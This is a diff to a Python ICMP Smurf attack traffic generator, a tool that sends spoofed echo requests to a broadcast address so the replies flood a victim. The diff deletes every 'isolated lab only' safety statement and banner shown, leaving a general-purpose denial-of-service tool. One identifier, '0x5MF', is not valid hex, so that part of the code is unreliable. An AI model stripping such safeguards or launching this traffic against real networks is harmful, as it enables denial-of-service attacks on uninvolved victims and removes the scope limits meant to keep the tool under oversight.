@@ -1,26 +1,10 @@
 #!/usr/bin/env python3
 """
-=============================================================================
 ICMP Smurf Attack — Traffic Generator
-=============================================================================
-Implements the four-phase attack chain from the Security Design Report §5:
-
   Phase 1: Source-address spoofing   (src = victim IP)
   Phase 2: Directed-broadcast dest   (dst = amplifier broadcast address)
   Phase 3: Reflection                (amplifier hosts reply to victim)
   Phase 4: Repetition               (controlled rate, configurable count)
-
-Safety: This script is designed ONLY for use inside the isolated Docker lab.
-        All networks are internal with no external routing.
-
-Usage:
-    python3 smurf_attack.py                     # defaults
-    python3 smurf_attack.py --rate 5 --count 20
-    python3 smurf_attack.py --victim-ip 198.51.100.10 \
-                            --broadcast-ip 203.0.113.255 \
-                            --payload-size 64 \
-                            --rate 2 --count 10
-=============================================================================
 """
 
 import argparse
@@ -48,13 +32,13 @@ def build_smurf_packet(victim_ip, broadcast_ip, payload_size, seq_num, ttl):
     """
     Construct a single spoofed ICMP Echo Request packet.
 
-    IPv4 Header (§7.1):
+    IPv4 Header:
         Source Address:      victim_ip      (SPOOFED)
         Destination Address: broadcast_ip   (DIRECTED BROADCAST)
         Protocol:            1 (ICMP)
         TTL:                 configurable
 
-    ICMP Header (§7.2):
+    ICMP Header:
         Type: 8 (Echo Request)
         Code: 0
         Identifier: 0x5MF (fixed for easy filtering)
@@ -89,7 +73,6 @@ def run_attack(args):
 
     print("=" * 70)
     print("  ICMP SMURF ATTACK — TRAFFIC GENERATOR")
-    print("  ⚠️  FOR ISOLATED LAB USE ONLY")
     print("=" * 70)
     print(f"  Victim IP (spoofed src) : {args.victim_ip}")
     print(f"  Broadcast IP (dst)      : {args.broadcast_ip}")
@@ -172,7 +155,7 @@ def run_normal_ping(args):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="ICMP Smurf Attack Traffic Generator (Isolated Lab Only)",
+        description="ICMP Smurf Attack Traffic Generator",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
